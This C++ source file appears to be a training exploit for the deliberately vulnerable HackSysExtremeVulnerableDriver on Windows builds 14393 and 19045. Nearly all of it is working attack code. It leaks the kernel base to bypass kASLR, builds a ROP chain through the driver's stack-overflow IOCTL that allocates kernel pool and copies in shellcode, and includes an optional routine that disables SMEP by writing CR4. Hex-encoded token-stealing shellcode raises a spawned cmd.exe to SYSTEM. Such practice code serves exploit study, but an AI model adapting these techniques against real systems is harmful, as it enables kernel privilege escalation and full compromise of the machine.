#pragma warning(disable: 4996)
#include <iostream>
#include <string>
#include <vector>
#include <Windows.h>
#include <Psapi.h>
#include "ExploitData.h"

#define HEVD_DEVICENAME	"\\\\.\\HackSysExtremeVulnerableDriver"
#define IOCTL(opcode) CTL_CODE(FILE_DEVICE_UNKNOWN, opcode, METHOD_NEITHER, FILE_ANY_ACCESS)
#define STACK_OVERFLOW_OPCODE IOCTL(0x800)
#define LAYER_SIZE = 0x8

bool initialize();
HANDLE getHandle();
LPVOID pooledPayload(SIZE_T bufferSize, SIZE_T offset);
LPVOID getKernelBase();
unsigned long long getKernelSymbolAddress(HMODULE userKernelBase, LPVOID kernelBase, LPCSTR symbol);

void kernel_exploit();

unsigned long long _kernel_ExAllocatePoolWithTag = 0;
unsigned long long _kernel_memcpy = 0;
unsigned long long _kernel_PsLookupProcessByProcessId = 0;
unsigned long long _kernel_PsReferencePrimaryToken = 0;
unsigned long long _kernel_KiKernelSysretExit = 0x3fa580;
unsigned long long _shellcodeBuffer = 0;


int _version = 0;
std::string _OS = "";

int main() {
	if (initialize()) return 0;
	kernel_exploit();
	return 0;
}

void checkVersion() {
	using namespace std;

	HKEY hKey;
	const char* subKey = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";

	const char* q_ProductName = "ProductName";
	const char* q_BuildNumber = "CurrentBuildNumber";

	char r_ProductName[255];
	char r_BuildNumber[255];

	DWORD bufferSize = 255;
	RegOpenKeyExA(HKEY_LOCAL_MACHINE, subKey, 0, KEY_READ, &hKey);

	RegQueryValueExA(hKey, q_ProductName, NULL, NULL, (LPBYTE)r_ProductName, &bufferSize);
	_OS = string(r_ProductName, bufferSize - 1);

	RegQueryValueExA(hKey, q_BuildNumber, NULL, NULL, (LPBYTE)r_BuildNumber, &bufferSize);
	_version = stoi(r_BuildNumber);

	RegCloseKey(hKey);

	cout << "[+] Current Version : " << _OS << " Build " << _version << endl;

	return;
}

bool initialize() {
	using namespace std;

	cout << BANNER << endl;
	checkVersion();

	if (_version != 14393 && _version != 19045) {
		cout << "[!] Exploit no support this version !" << endl;
		return true;
	}

	return false;
}

bool getHandle(HANDLE &h) {
	h = CreateFileA(
		HEVD_DEVICENAME,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	if (h == INVALID_HANDLE_VALUE) {
		printf("[!] Failed to get handle.\n");
		return true;
	}

	return false;
}

LPVOID getKernelBase() {
	LPVOID drivers[1024];
	DWORD cbNeeded;

	EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded);

	return drivers[0];
}

unsigned long long getKernelSymbolAddress(HMODULE userKernelBase, LPVOID kernelBase, LPCSTR symbol) {
	unsigned long long offset = 0;

	LPVOID symbolAddr = GetProcAddress(userKernelBase, symbol);
	if (symbolAddr == NULL) return NULL;

	return (unsigned long long)symbolAddr - (unsigned long long)userKernelBase + (unsigned long long)kernelBase;
}

DWORD spawnCMD() {
	LPSTR CMD = (LPSTR)"C:\\Windows\\System32\\cmd.exe";
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	ZeroMemory(&pi, sizeof(pi));
	si.cb = sizeof(si);

	bool result = CreateProcessA(CMD, NULL, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
	if (result == 0) return 0;
	return pi.dwProcessId;
}

LPVOID generateRing0Shellcode() {
	char shellcode[] = 
		"\x55"									   // push   rbp
		"\x48\x89\xe5"							   // mov    rbp,rsp
		"\x48\x81\xec\x00\x01\x00\x00"			   // sub    rsp,0x100
		"\x48\xc7\xc1\x87\x87\x00\x00"			   // mov    rcx,0x8787
		"\x48\x83\xec\x08"						   // sub    rsp,0x8
		"\x48\x89\xe2"							   // mov    rdx,rsp
		"\x48\xbb\x00\x00\x00\x00\xff\xff\xff\xff" // movabs rbx,0xffffffff00000000
		"\xff\xd3"								   // call   rbx
		"\x48\x8b\x0c\x24"						   // mov    rcx,QWORD PTR [rsp]
		"\x48\xbb\x00\x00\x00\x00\xff\xff\xff\xff" // movabs rbx,0xffffffff00000000
		"\xff\xd3"								   // call   rbx
		"\x48\x83\xc0\x40"						   // add    rax,0x40
		"\x48\xb9\xfc\xff\xff\xff\x00\x00\x00\x00" // movabs rcx,0xfffffffc
		"\x48\x89\x08"							   // mov    QWORD PTR [rax],rcx
		"\x48\x83\xc0\x08"						   // add    rax,0x8
		"\x48\x89\x08"							   // mov    QWORD PTR [rax],rcx
		"\x48\x83\xc0\x08"						   // add    rax,0x8
		"\x48\x89\x08"							   // mov    QWORD PTR [rax],rcx
		"\x48\x83\xc0\x08"						   // add    rax,0x8
		"\x48\x31\xc0"							   // xor    rax,rax
		"\x48\x31\xdb"							   // xor    rbx,rbx
		"\x48\x31\xc9"							   // xor    rcx,rcx
		"\x48\x31\xd2"							   // xor    rdx,rdx
		"\x48\x31\xff"							   // xor    rdi,rdi
		"\x48\x31\xf6"							   // xor    rsi,rsi
		"\x48\x89\xec"							   // mov    rsp,rbp
		"\x5d"									   // pop    rbp
		"\xc3"									   // ret
		;


	char shellcodeA[] =
		"\xcc"
		"\x55"									   // push   rbp
		"\x48\x89\xe5"							   // mov    rbp,rsp
		"\x48\x81\xec\x00\x01\x00\x00"			   // sub    rsp,0x100
		"\x48\xc7\xc1\x87\x87\x00\x00"			   // mov    rcx,0x8787
		"\x48\x83\xec\x08"						   // sub    rsp,0x8
		"\x48\x89\xe2"							   // mov    rdx,rsp
		"\x48\x31\xc0"							   // xor    rax,rax
		"\x48\x31\xdb"							   // xor    rbx,rbx
		"\x48\x31\xc9"							   // xor    rcx,rcx
		"\x48\x31\xd2"							   // xor    rdx,rdx
		"\x48\x31\xff"							   // xor    rdi,rdi
		"\x48\x31\xf6"							   // xor    rsi,rsi
		"\x4d\x31\xc0"							   // xor    r8
		"\x4d\x31\xc9"							   // xor    r9
		"\x4d\x31\xd2"							   // xor    r10
		"\x4d\x31\xdb"							   // xor    r11
		"\x4d\x31\xe4"							   // xor    r12
		"\x4d\x31\xed"							   // xor    r13
		"\x4d\x31\xf6"							   // xor    r14
		"\x4d\x31\xff"							   // xor    r15
		"\x48\x89\xec"							   // mov    rsp,rbp
		"\x5d"									   // pop    rbp
		"\xc2\x08\x00"							   // ret 0x8
		;

	BYTE StealToken[0x100] = {
	0xcc, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x80,
	0xb8, 0x00, 0x00, 0x00, 0x49, 0x89, 0xc0, 0x4d, 0x8b, 0x80, 0x48, 0x04,
	0x00, 0x00, 0x49, 0x81, 0xe8, 0x48, 0x04, 0x00, 0x00, 0x4d, 0x8b, 0x88,
	0x40, 0x04, 0x00, 0x00, 0x49, 0x83, 0xf9, 0x04, 0x75, 0xe5, 0x49, 0x8b,
	0x88, 0xb8, 0x04, 0x00, 0x00, 0x80, 0xe1, 0xf0, 0x48, 0x89, 0x88, 0xb8,
	0x04, 0x00, 0x00, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00,
	0x66, 0x8b, 0x88, 0xe4, 0x01, 0x00, 0x00, 0x66, 0xff, 0xc1, 0x66, 0x89,
	0x88, 0xe4, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x90, 0x90, 0x00, 0x00, 0x00,
	0x48, 0x8b, 0x8a, 0x68, 0x01, 0x00, 0x00, 0x4c, 0x8b, 0x9a, 0x78, 0x01,
	0x00, 0x00, 0x48, 0x8b, 0xa2, 0x80, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xaa,
	0x58, 0x01, 0x00, 0x00, 0x31, 0xc0, 0x0f, 0x01, 0xf8, 0x48, 0x0f, 0x07,
	0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	0xff, 0xff, 0xff
	};

	LPVOID shellcodeBuffer = VirtualAlloc(NULL, (SIZE_T)0x100, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	DWORD PID = spawnCMD();

	memcpy((char*)shellcodeBuffer, StealToken, sizeof(StealToken));
	//memcpy((char*)shellcodeBuffer + 11 + 3, &PID, sizeof(DWORD));
	//memcpy((char*)shellcodeBuffer + 11 + 16, &_kernel_PsLookupProcessByProcessId, 8);
	//memcpy((char*)shellcodeBuffer + 11 + 32, &_kernel_PsReferencePrimaryToken, 8);
	//memcpy((char*)shellcodeBuffer + 79, &_kernel_KiKernelSysretExit, 8);

	return shellcodeBuffer;
}

LPVOID generateRing3Shellcode() {
	char shellcode[] =
		"\x48\x83\xec\x50"
		"\x48\xc7\xc1\x87\x87\x00\x00"			   // mov    rcx,0x8787
		"\x48\x83\xec\x08"						   // sub    rsp,0x8
		"\x48\x89\xe2"							   // mov    rdx,rsp
		"\x48\xbb\x00\x00\x00\x00\xff\xff\xff\xff" // movabs rbx,0xffffffff00000000
		"\xff\xd3"								   // call   rbx
		"\x48\x8b\x0c\x24"						   // mov    rcx,QWORD PTR [rsp]
		"\x48\xbb\x00\x00\x00\x00\xff\xff\xff\xff" // movabs rbx,0xffffffff00000000
		"\xff\xd3"								   // call   rbx
		"\x48\x83\xc0\x40"						   // add    rax,0x40
		"\x48\xb9\xfc\xff\xff\xff\x00\x00\x00\x00" // movabs rcx,0xfffffffc
		"\x48\x89\x08"							   // mov    QWORD PTR [rax]
		"\x48\x83\xc0\x08"						   // add    rax,0x8
		"\x48\x89\x08"							   // mov    QWORD PTR [rax]
		"\x48\x83\xc0\x08"						   // add    rax,0x8
		"\x48\x89\x08"							   // mov    QWORD PTR [rax]
		"\x48\x83\xc0\x08"						   // add    rax,0x8
		"\x48\x31\xf6"							   // xor    rsi,rsi
		"\x48\x31\xc0"							   // xor    rax,rax
		"\x48\x83\xc4\x50"
		;

	LPVOID shellcodeBuffer = VirtualAlloc(NULL, (SIZE_T)0x100, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	DWORD PID = spawnCMD();

	memcpy((char*)shellcodeBuffer, shellcode, sizeof(shellcode));
	memcpy((char*)shellcodeBuffer + 27 + 3, &PID, sizeof(DWORD));
	memcpy((char*)shellcodeBuffer + 27 + 16, &_kernel_PsLookupProcessByProcessId, 8);
	memcpy((char*)shellcodeBuffer + 27 + 32, &_kernel_PsReferencePrimaryToken, 8);

	return shellcodeBuffer;
}

bool bypasskASLR(LPVOID& kernelBase, HMODULE& userKernelBase) {
	using namespace std;

	LPCSTR ntoskrnlPath = "C:\\Windows\\System32\\ntoskrnl.exe";
	kernelBase = getKernelBase();
	userKernelBase = LoadLibraryA(ntoskrnlPath);

	if (kernelBase == 0) {
		cout << "[!] Failed to get kernel base :(" << endl;
		return true;
	}
	else if (userKernelBase == NULL) {
		cout << "[!] Failed to get ntoskrnl.exe handle :(" << endl;
		return true;
	}

	cout << "[+] Successful Leak KernelBase : " << kernelBase << endl;
	cout << "[+] Successful Load UserSpace Kernel Handler : " << userKernelBase << endl;

	return false;
}

bool getKeySymbols(LPVOID kernelBase, HMODULE userKernelBase) {
	using namespace std;

	_kernel_ExAllocatePoolWithTag = getKernelSymbolAddress(userKernelBase, kernelBase, "ExAllocatePoolWithTag");
	_kernel_memcpy = getKernelSymbolAddress(userKernelBase, kernelBase, "memcpy");
	_kernel_PsLookupProcessByProcessId = getKernelSymbolAddress(userKernelBase, kernelBase, "PsLookupProcessByProcessId");
	_kernel_PsReferencePrimaryToken = getKernelSymbolAddress(userKernelBase, kernelBase, "PsReferencePrimaryToken");
	_kernel_KiKernelSysretExit += (unsigned long long)kernelBase;

	if (_kernel_ExAllocatePoolWithTag == NULL) {
		cout << "[!] Failed to leak ExAllocatePoolWithTag address :(" << endl;
		return true;
	}
	else if (_kernel_memcpy == NULL) {
		cout << "[!] Failed to leak memcpy address :(" << endl;
		return true;
	}

	cout << "[+] Successful Leak ExAllocatePoolWithTag Address : " << _kernel_ExAllocatePoolWithTag << endl;
	cout << "[+] Successful Leak memcpy Address : " << _kernel_memcpy << endl;

	return false;
}

void addPayload(LPVOID& buffer, SIZE_T& offset, unsigned long long payload) {
	memcpy((char*)buffer + offset, &payload, 8);
	offset += 8;
	return;
}

void build_CopyShellcodeROP(LPVOID& buffer, SIZE_T offset, int OS) {

	// Setup Parameter of the ExAllocatePoolWithTag
	// PoolType
	addPayload(buffer, offset, ROP_Gadgets[OS][0]); // xor ecx, ecx ; mov rax, rcx ; ret
	// NumberOfBytes
	addPayload(buffer, offset, ROP_Gadgets[OS][1]); // pop rdx ; ret
	addPayload(buffer, offset, ROP_ExploitData[0]); // 0x1000

	// Call ExAllocatePoolWithTag
	addPayload(buffer, offset, _kernel_ExAllocatePoolWithTag);
	addPayload(buffer, offset, ROP_Gadgets[OS][2]); // add rsp, 0x20 ; ret
	offset += 0x20;

	// Storge Result of the ExAllocatePoolWithTag
	addPayload(buffer, offset, ROP_Gadgets[OS][3]); // push rax, pop rdi ; ret

	// Setup Parameter of the memcpy
	// dest
	addPayload(buffer, offset, ROP_Gadgets[OS][7]); // push rax ; pop r13 ; ret
	addPayload(buffer, offset, ROP_Gadgets[OS][6]); // xchg r8, r13 ; ret
	addPayload(buffer, offset, ROP_Gadgets[OS][5]); // mov rcx, r8 ; mov rax, rcx ; ret
	// src
	addPayload(buffer, offset, ROP_Gadgets[OS][1]); // pop rdx ; ret
	addPayload(buffer, offset, _shellcodeBuffer);
	// count
	addPayload(buffer, offset, ROP_Gadgets[OS][8]); // pop r8 ; ret
	addPayload(buffer, offset, ROP_ExploitData[1]); // 0x100

	// Call memcpy
	addPayload(buffer, offset, _kernel_memcpy);

	// Jump to shellcode
	addPayload(buffer, offset, ROP_Gadgets[OS][4]); // jmp rdi

	return;
}

void build_DisableSMEPROP(LPVOID& buffer, SIZE_T offset, int OS) {
	addPayload(buffer, offset, ROP_Gadgets[OS][10]); // pop rcx ; ret
	addPayload(buffer, offset, ROP_ExploitData[2]);  // CR4 Value
	addPayload(buffer, offset, ROP_Gadgets[OS][9]);  // mov cr4, rcx ; ret
	addPayload(buffer, offset, _shellcodeBuffer);

	return;
}

void build_ExperimentROP(LPVOID& buffer, SIZE_T offset, int OS) {
	addPayload(buffer, offset, ROP_Gadgets[OS][1]); // pop rdi ; ret
	addPayload(buffer, offset, ROP_ExploitData[3]); // -0x830
	addPayload(buffer, offset, ROP_Gadgets[OS][0]); // add esp ; edi ; ret

	return;
}

bool pooledPayload(LPVOID &exploitBuffer, SIZE_T bufferSize, LPVOID kernelBase) {
	using namespace std;

	SIZE_T offset = OFFSET; // 2072
	int OS = 0;

	switch (_version) {
	case 19045:
		OS = 0;
		break;
	case 14393:
		OS = 1;
		break;
	}


	cout << "[+] Generate Shellcode..." << endl;

	LPVOID shellcodeBuffer = generateRing0Shellcode();

	if (shellcodeBuffer == NULL) {
		cout << "[!] Failed to generate shellcode :(";
		return true;
	}

	_shellcodeBuffer = (unsigned long long)shellcodeBuffer;
	cout << "[+] Successful generate shellcode" << endl;

	cout << "[+] Current ROP Based OS Build Version : " << _version << endl;

	cout << "[+] Rebase ROP Chains...";
	for (unsigned int i = 0; i < ROP_Gadgets.size(); i++) {
		for (unsigned int j = 0; j < ROP_Gadgets[i].size(); j++) {
			ROP_Gadgets[i][j] += (unsigned long long)kernelBase;
		}
	}
	cout << "Done" << endl;

	exploitBuffer = VirtualAlloc(NULL, bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memset((char*)exploitBuffer, 'A', offset);

	build_CopyShellcodeROP(exploitBuffer, offset, OS);
	//build_DisableSMEPROP(exploitBuffer, offset, OS);
	//build_ExperimentROP(exploitBuffer, offset, OS);


	printf("[+] Payload pooled, sending malicious payload ;)\n");

	return false;
}

void kernel_exploit() {
	using namespace std;

	HANDLE h;

	LPVOID exploitBuffer;
	SIZE_T bufferSize = 0x900;

	LPVOID kernelBase;
	HMODULE userKernelBase;
	
	if (getHandle(h)) return;
	if (bypasskASLR(kernelBase, userKernelBase)) return;
	if (getKeySymbols(kernelBase, userKernelBase)) return;
	if (pooledPayload(exploitBuffer, bufferSize, kernelBase)) return;

	bool result = DeviceIoControl(h, STACK_OVERFLOW_OPCODE, exploitBuffer, (DWORD)bufferSize, NULL, 0, NULL, NULL);
	printf("[+] Payload Send !");

	if (!result) printf("[!] IOCTL Failed %X\n", GetLastError());
	return;
}
